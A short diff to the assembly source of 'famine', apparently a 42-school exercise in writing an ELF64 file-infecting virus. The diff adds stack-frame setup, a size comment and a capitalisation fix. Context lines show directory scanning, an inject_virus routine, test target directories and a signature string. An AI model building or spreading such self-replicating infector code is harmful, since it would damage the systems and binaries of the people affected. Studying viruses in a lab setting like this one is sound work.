@@ -1,4 +1,4 @@
-; famine elf64 - size 726 bytes
+; famine elf64 - size 723 bytes
 
 %include "famine.inc"
 
@@ -17,6 +17,11 @@ _start:
 				push		rsi
 				push		rcx
 				push		rdx
+
+	; set up famine struc on stack
+				push		rbp
+				mov			rbp, rsp
+				sub			rbp, famine_size
 
 				lea			rax, [rel _start]
 				mov			rdx, [rel virus_entry]
@@ -71,6 +76,7 @@ _start:
 				jnz			.opendir
 
 				pop			rax
+				pop			rbp
 				pop			rdx
 				pop			rcx
 				pop			rsi
@@ -234,7 +240,7 @@ inject_virus:
 				pop			r13
 				ret
 
-	; persistent Data
+	; persistent data
 infect_dir		db			"/tmp/test/",0,"/tmp/test2/",0,0
 signature		db			"famine! linux @42siliconvalley",0
 virus_entry		dq			_start
